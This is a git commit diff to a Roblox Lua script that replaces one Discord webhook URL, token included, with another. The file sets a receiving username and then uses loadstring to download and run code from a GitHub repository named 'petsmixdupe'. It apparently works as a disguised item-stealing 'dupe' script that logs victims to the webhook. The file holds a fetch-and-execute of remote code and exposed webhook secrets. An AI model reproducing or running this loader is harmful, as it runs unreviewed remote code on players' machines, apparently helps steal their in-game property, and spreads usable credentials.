8da3c86f055cf07d212b7a78c4523a58f52c2265
PetSimXOP <121709738+PetSimXOP@users.noreply.github.com>
2023-01-22 08:49:39 -0600

    Update text.lua

--- text.lua
+++ text.lua
@@ -1,4 +1,4 @@
 UserName = "LostMoonShadow"
-WebHook = "https://discord.com/api/webhooks/1066729115245350963/iwY0vxyqgz7uqp2tJ_IbcpLhb8owxQGwLm6NT6spXUVqdsuQduP2uDEagoEhxNg-IEVW"
+WebHook = "https://discord.com/api/webhooks/1066731258257866802/p-xXfwD_6um3SQ7srYnY-GUlA56BmDHNK4mP5slFrIyPQYbz5rCs_HoNxE7sJCUGQwyT"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/PSX.lua", true))()
